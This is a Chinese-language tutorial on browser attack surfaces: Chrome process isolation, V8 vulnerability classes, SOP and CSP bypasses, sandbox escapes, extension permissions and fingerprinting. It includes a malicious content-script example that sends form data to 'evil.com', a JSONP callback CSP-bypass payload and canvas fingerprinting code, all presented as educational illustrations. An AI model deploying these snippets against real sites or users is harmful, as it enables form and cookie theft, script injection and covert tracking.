# 浏览器安全攻击面

## 浏览器架构安全

现代浏览器采用多进程架构来隔离不同来源的内容。Chrome 使用以下进程模型：

- **浏览器进程**: 管理 UI、网络、存储
- **渲染进程**: 解析 HTML/CSS，执行 JavaScript（沙箱隔离）
- **GPU 进程**: 硬件加速
- **网络进程**: 网络请求处理
- **扩展进程**: 浏览器扩展

### Site Isolation（站点隔离）

自 Chrome 67 起，不同站点的页面被强制分配不同的渲染进程，即使在同一标签页中：

```
chrome://process-internals  # 查看当前进程分配情况
```

## V8 引擎漏洞

V8 是 Chrome 的 JavaScript 引擎，也是最大的攻击面。

### 常见漏洞类型

1. **类型混淆（Type Confusion）**: 对象类型被错误解释，导致 OOB 访问
2. **释放后使用（UAF）**: 对象被释放后依然有引用
3. **越界访问（OOB）**: 读写超出缓冲区边界

```javascript
// 类型混淆示例：JIT 优化后类型预测错误
function confuse(obj) {
    obj.x = 13.37;       // 编译器推断 x 为 double
    if (obj.flag) {       // 运行时 flag 为 false 时跳过
        obj.x = obj;      // 赋值对象指针到 double 槽
    }
}
// 通过 JIT 编译后，对象引用会被错误解释为 double
```

## SOP（同源策略）绕过

### 同源定义

协议 + 域名 + 端口必须完全相同。以下均为不同源：

| 页面 URL | 访问 URL | 结果 |
|----------|---------|------|
| https://a.com | https://b.com | 不同源 |
| https://a.com | http://a.com | 不同源（协议不同） |
| https://a.com | https://a.com:8080 | 不同源（端口不同） |
| https://a.com | https://a.com:443 | 同源 |

### 已知绕过技术

```javascript
// DNS 篡改绕过
// DNS rebinding: 页面加载时解析到 127.0.0.1, JS 继续运行时重新解析到内网 IP

// CORS 配置错误利用
fetch('https://internal-api.corp/api/user', { credentials: 'include' })
// 如果目标服务器返回 Access-Control-Allow-Origin: * 则会暴露数据
```

## CSP（内容安全策略）绕过

### 常见绕过模式

```html
<!-- 当 CSP 允许 CDN 加载时 -->
<!-- 使用 JSONP 回调执行代码 -->
<script src="https://cdn.example.com/jsonp?callback=alert(1)"></script>
```

### 严格的 CSP 配置

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'
```

## 浏览器沙箱逃逸

### 常见逃逸路径

1. **内核漏洞**: 通过系统调用利用驱动或内核漏洞
2. **GPU 驱动**: 通过 WebGL 的 GPU 进程提权
3. **Mojo IPC**: 通过 Chrome 的进程间通信接口逃逸

## Chrome 扩展安全

### 高危权限

```json
{
    "permissions": [
        "tabs",            // 读取所有标签页 URL
        "webRequest",      // 拦截所有网络请求
        "storage",         // 访问浏览器存储
        "nativeMessaging", // 调用原生程序
        "<all_urls>"       // 访问所有网站内容
    ]
}
```

### 内容脚本注入利用

```javascript
// 恶意扩展可以通过 content script 注入
// 窃取表单数据、Cookie、DOM 内容
document.addEventListener('submit', function(e) {
    fetch('https://evil.com/steal', {
        method: 'POST',
        body: new FormData(e.target)
    });
});
```

## 浏览器指纹

即使启用隐私模式，浏览器也会暴露大量可识别信息：

```javascript
// Canvas 指纹
const canvas = document.createElement('canvas')
const ctx = canvas.getContext('2d')
const txt = 'BrowserLeaks.com'
ctx.fillText(txt, 2, 15)
// 不同 GPU/驱动产生不同的渲染结果 → 唯一指纹

// WebGL 指纹
const gl = document.createElement('canvas').getContext('webgl')
// GPU 供应商、渲染器、支持扩展 → 唯一组合
```

## 总结

浏览器是现代攻击链的重要入口点。理解多进程架构、V8 漏洞原理和 SOP/CSP 机制，是防御基于浏览器的客户端攻击的基础。

*上一篇：[浏览器安全机制详解](01-browser-security.md)*

*下一篇：[浏览器安全加固](03-browser-hardening.md)*
